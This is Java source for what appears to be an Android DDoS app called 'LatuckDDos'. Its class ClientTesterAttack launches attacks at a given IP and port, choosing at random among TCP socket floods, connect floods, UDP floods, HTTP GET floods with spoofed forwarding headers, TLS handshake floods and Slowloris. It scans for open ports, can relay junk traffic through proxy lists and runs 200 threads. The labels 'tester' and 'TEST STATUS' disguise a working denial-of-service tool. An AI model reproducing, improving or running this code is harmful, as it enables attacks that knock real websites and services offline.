/*________________________________________________*//*


               Author: @Squatedev
               age: 19
               name: null


/*________________________________________________*/

package dev.squatedev.latuckddos.ProxySend;

import android.content.Context;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetSocketAddress;
import java.net.Socket;

import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.SSLSocket;
import java.io.OutputStream;
import java.io.InputStream;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

public class ClientTesterAttack {
    private static ClientTesterAttack instance;
    private Context context;
    private String tag = "LatuckDDos";
    private String nan = "n/a";
    private boolean lastRequestSuccess = false;
    private long lastPing = 0;
    private Random random = new Random();
    private ExecutorService attackPool = Executors.newFixedThreadPool(200);
    private AtomicInteger activeAttacks = new AtomicInteger(0);

    private ClientTesterAttack(Context context){
        if(context != null){
            this.context = context;
        } else {
            Log.i(tag, "Context class ProxyClient = null ");
        }
    }

    public static synchronized ClientTesterAttack getInstance(Context ctx) {
        if(instance==null) instance = new ClientTesterAttack(ctx);
        return instance;
    }

    public void send(String ip, String port, String json, boolean autoFindPort, boolean useProxy){
        attackPool.execute(() -> {
            String targetPort = port;
            if(autoFindPort) {
                targetPort = String.valueOf(findOpenPort(ip));
            }

            if(useProxy && json != null && !json.isEmpty()) {
                sendWithProxySocket(ip, targetPort, json);
            } else {
                int attackType = random.nextInt(6);
                switch(attackType) {
                    case 0: sendDirectSocketFlood(ip, targetPort); break;
                    case 1: sendSynFlood(ip, targetPort); break;
                    case 2: sendUdpFlood(ip, targetPort); break;
                    case 3: sendHttpFlood(ip, targetPort); break;
                    case 4: sendSslFlood(ip, targetPort); break;
                    case 5: sendSlowloris(ip, targetPort); break;
                }
            }
            activeAttacks.decrementAndGet();
        });
        activeAttacks.incrementAndGet();
    }

    private int findOpenPort(String ip) {
        int[] ports = {80, 443, 8080, 8443, 21, 22, 23, 25, 53, 110, 143, 3306, 3389, 5432, 6379, 27017};
        for(int port : ports) {
            try {
                Socket socket = new Socket();
                socket.connect(new InetSocketAddress(ip, port), 300);
                socket.close();
                return port;
            } catch (Exception e) {
            }
        }
        return 80;
    }

    private void sendWithProxySocket(String ip, String port, String json) {
        try {
            JSONObject jsonObject = new JSONObject(json);
            JSONArray proxies = jsonObject.getJSONArray("proxies");

            if(proxies.length() == 0) {
                lastRequestSuccess = false;
                return;
            }

            int index = random.nextInt(proxies.length());
            JSONObject proxy = proxies.getJSONObject(index);
            String proxyIp = proxy.getString("ip");
            String proxyPort = proxy.getString("port");

            long startTime = System.currentTimeMillis();

            Socket proxySocket = new Socket();
            proxySocket.setTcpNoDelay(true);
            proxySocket.setSoTimeout(8000);
            proxySocket.connect(new InetSocketAddress(proxyIp, Integer.parseInt(proxyPort)), 3000);

            OutputStream out = proxySocket.getOutputStream();
            String connectRequest = "CONNECT " + ip + ":" + port + " HTTP/1.1\r\n" +
                    "Host: " + ip + ":" + port + "\r\n" +
                    "User-Agent: " + getRandomUserAgent() + "\r\n" +
                    "Proxy-Connection: Keep-Alive\r\n" +
                    "\r\n";
            out.write(connectRequest.getBytes());
            out.flush();

            InputStream in = proxySocket.getInputStream();
            StringBuilder response = new StringBuilder();
            int ch;
            while((ch = in.read()) != -1) {
                response.append((char)ch);
                if(response.toString().contains("\r\n\r\n")) break;
            }

            if(response.toString().contains("200")) {
                for(int i = 0; i < 500; i++) {
                    byte[] junkData = new byte[16384];
                    random.nextBytes(junkData);
                    out.write(junkData);
                    if(i % 10 == 0) out.flush();
                }
                out.flush();

                lastRequestSuccess = true;
                lastPing = System.currentTimeMillis() - startTime;
            } else {
                lastRequestSuccess = false;
            }

            proxySocket.close();

        } catch (Exception e) {
            lastRequestSuccess = false;
            lastPing = 0;
        }
    }

    private void sendDirectSocketFlood(String ip, String port) {
        Socket[] sockets = new Socket[100];
        OutputStream[] streams = new OutputStream[100];

        try {
            long startTime = System.currentTimeMillis();
            int successConnections = 0;

            for(int i = 0; i < 100; i++) {
                try {
                    Socket socket = new Socket();
                    socket.setTcpNoDelay(true);
                    socket.setSoTimeout(10000);
                    socket.connect(new InetSocketAddress(ip, Integer.parseInt(port)), 1500);

                    if(socket.isConnected()){
                        sockets[i] = socket;
                        streams[i] = socket.getOutputStream();
                        successConnections++;
                    }
                } catch (Exception e) {
                }
            }

            if(successConnections > 0) {
                for(int round = 0; round < 50; round++) {
                    for(int i = 0; i < successConnections; i++) {
                        try {
                            if(streams[i] != null) {
                                byte[] junkData = new byte[32768];
                                random.nextBytes(junkData);
                                streams[i].write(junkData);
                                if(round % 5 == 0) streams[i].flush();
                            }
                        } catch (Exception e) {
                        }
                    }
                }

                lastRequestSuccess = true;
                lastPing = System.currentTimeMillis() - startTime;
            } else {
                lastRequestSuccess = false;
            }

            for(int i = 0; i < 100; i++) {
                try { if(sockets[i] != null) sockets[i].close(); } catch (Exception e) {}
            }

        } catch (Exception e) {
            lastRequestSuccess = false;
            lastPing = 0;
        }
    }

    private void sendSynFlood(String ip, String port) {
        try {
            long startTime = System.currentTimeMillis();
            for(int i = 0; i < 500; i++) {
                try {
                    Socket socket = new Socket();
                    socket.setTcpNoDelay(true);
                    socket.setSoTimeout(100);
                    socket.connect(new InetSocketAddress(ip, Integer.parseInt(port)), 50);
                } catch (Exception e) {
                }
            }
            lastRequestSuccess = true;
            lastPing = System.currentTimeMillis() - startTime;
        } catch (Exception e) {
            lastRequestSuccess = false;
            lastPing = 0;
        }
    }

    private void sendUdpFlood(String ip, String port) {
        try {
            long startTime = System.currentTimeMillis();
            DatagramSocket udpSocket = new DatagramSocket();
            udpSocket.setSoTimeout(5000);

            byte[] buffer = new byte[65507];
            random.nextBytes(buffer);

            for(int i = 0; i < 100; i++) {
                try {
                    DatagramPacket packet = new DatagramPacket(buffer, buffer.length,
                            new InetSocketAddress(ip, Integer.parseInt(port)));
                    udpSocket.send(packet);
                } catch (Exception e) {
                }
            }

            udpSocket.close();
            lastRequestSuccess = true;
            lastPing = System.currentTimeMillis() - startTime;
        } catch (Exception e) {
            lastRequestSuccess = false;
            lastPing = 0;
        }
    }

    private void sendHttpFlood(String ip, String port) {
        try {
            long startTime = System.currentTimeMillis();

            String[] paths = {"/", "/index.html", "/api/v1/test", "/wp-admin", "/admin", "/login",
                    "/search?q=" + random.nextInt(), "/?s=" + random.nextLong()};

            for(int i = 0; i < 50; i++) {
                try {
                    Socket socket = new Socket();
                    socket.setTcpNoDelay(true);
                    socket.connect(new InetSocketAddress(ip, Integer.parseInt(port)), 2000);

                    OutputStream out = socket.getOutputStream();
                    String path = paths[random.nextInt(paths.length)];
                    String request = "GET " + path + " HTTP/1.1\r\n" +
                            "Host: " + ip + "\r\n" +
                            "User-Agent: " + getRandomUserAgent() + "\r\n" +
                            "Accept: */*\r\n" +
                            "Accept-Language: en-US,en;q=0.9\r\n" +
                            "Accept-Encoding: gzip, deflate\r\n" +
                            "Cache-Control: no-cache\r\n" +
                            "Connection: keep-alive\r\n" +
                            "X-Forwarded-For: " + getRandomIP() + "\r\n" +
                            "X-Real-IP: " + getRandomIP() + "\r\n" +
                            "\r\n";
                    out.write(request.getBytes());
                    out.flush();
                    socket.close();
                } catch (Exception e) {
                }
            }

            lastRequestSuccess = true;
            lastPing = System.currentTimeMillis() - startTime;
        } catch (Exception e) {
            lastRequestSuccess = false;
            lastPing = 0;
        }
    }

    private void sendSslFlood(String ip, String port) {
        try {
            long startTime = System.currentTimeMillis();

            for(int i = 0; i < 30; i++) {
                try {
                    SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();
                    SSLSocket sslSocket = (SSLSocket) factory.createSocket();
                    sslSocket.setSoTimeout(5000);
                    sslSocket.connect(new InetSocketAddress(ip, Integer.parseInt(port)), 3000);
                    sslSocket.startHandshake();
                    sslSocket.close();
                } catch (Exception e) {
                }
            }

            lastRequestSuccess = true;
            lastPing = System.currentTimeMillis() - startTime;
        } catch (Exception e) {
            lastRequestSuccess = false;
            lastPing = 0;
        }
    }

    private void sendSlowloris(String ip, String port) {
        try {
            long startTime = System.currentTimeMillis();
            Socket[] sockets = new Socket[50];
            OutputStream[] streams = new OutputStream[50];

            for(int i = 0; i < 50; i++) {
                try {
                    sockets[i] = new Socket();
                    sockets[i].setSoTimeout(120000);
                    sockets[i].connect(new InetSocketAddress(ip, Integer.parseInt(port)), 3000);
                    streams[i] = sockets[i].getOutputStream();

                    String request = "GET / HTTP/1.1\r\n" +
                            "Host: " + ip + "\r\n" +
                            "User-Agent: " + getRandomUserAgent() + "\r\n" +
                            "Accept: */*\r\n";
                    streams[i].write(request.getBytes());
                    streams[i].flush();
                } catch (Exception e) {
                }
            }

            for(int round = 0; round < 100; round++) {
                for(int i = 0; i < 50; i++) {
                    try {
                        if(streams[i] != null) {
                            streams[i].write(("X-Slowloris: " + random.nextInt() + "\r\n").getBytes());
                            streams[i].flush();
                        }
                    } catch (Exception e) {
                    }
                }
                Thread.sleep(10000);
            }

            for(int i = 0; i < 50; i++) {
                try { if(sockets[i] != null) sockets[i].close(); } catch (Exception e) {}
            }

            lastRequestSuccess = true;
            lastPing = System.currentTimeMillis() - startTime;
        } catch (Exception e) {
            lastRequestSuccess = false;
            lastPing = 0;
        }
    }

    private String getRandomUserAgent() {
        String[] agents = {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
                "Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                "Mozilla/5.0 (iPad; CPU OS 13_0 like Mac OS X) AppleWebKit/605.1.15",
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
                "Mozilla/5.0 (PlayStation 4 5.05) AppleWebKit/601.2"
        };
        return agents[random.nextInt(agents.length)];
    }

    private String getRandomIP() {
        return random.nextInt(256) + "." + random.nextInt(256) + "." +
                random.nextInt(256) + "." + random.nextInt(256);
    }

    public String getServersPing(String json, int position){
        try {
            JSONObject jsonObject = new JSONObject(json);
            JSONArray proxies = jsonObject.getJSONArray("proxies");
            if(position >= 0 && position < proxies.length()) {
                JSONObject proxy = proxies.getJSONObject(position);
                String ip = proxy.getString("ip");
                String port = proxy.getString("port");

                long start = System.currentTimeMillis();
                Socket socket = new Socket();
                socket.connect(new InetSocketAddress(ip, Integer.parseInt(port)), 1500);
                socket.close();
                return (System.currentTimeMillis() - start) + "ms";
            }
        } catch (Exception e) {
        }
        return nan;
    }

    public String getStatus() {
        String status;
        if(lastRequestSuccess) {
            status = "<font color='#00FF00'>PASSED</font>";
        } else {
            status = "<font color='#FF0000'>FAILED</font>";
        }
        return "<b><font color='#FFFFFF'>TEST STATUS: </font>" + status + "</b>";
    }
}